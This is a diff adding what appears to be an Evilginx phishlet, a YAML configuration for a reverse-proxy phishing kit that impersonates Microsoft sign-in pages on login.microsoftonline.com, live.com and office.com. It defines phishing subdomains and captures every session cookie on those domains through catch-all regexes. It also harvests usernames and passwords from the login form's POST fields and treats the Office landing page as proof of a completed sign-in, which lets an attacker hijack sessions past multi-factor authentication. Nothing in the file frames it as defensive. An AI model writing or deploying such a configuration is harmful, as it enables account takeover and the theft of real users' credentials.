@@ -1,1 +1,57 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: true }
+ # - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "log", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+ # - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+ # - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+ # - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
 
+  
+sub_filters:
+#  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.live.com'
+    keys: ['.*:regexp']
+  - domain: 'live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.live.com'
+    keys: ['.*:regexp']
+  - domain: 'login.live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: '.microsoft.com'
+    keys: ['.*:regexp']
+  - domain: 'microsoft.com'
+    keys: ['.*:regexp']
+  - domain: '.office.com'
+    keys: ['.*:regexp']
+  - domain: 'office.com'
+    keys: ['.*:regexp']
+  - domain: 'www.office.com'
+    keys: ['.*:regexp']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+auth_urls:
+  - '/landingv2'
+# force_post:
+#   - path: '/oauth20_authorize(.+)'
+#     search:
+#       - {key: 'redirect_uri', search: '.*'}
+#     force:
+#       - {key: 'rredirect_ur;', value: 'https://www.office.com/landingv2'}
+#     type: 'get'
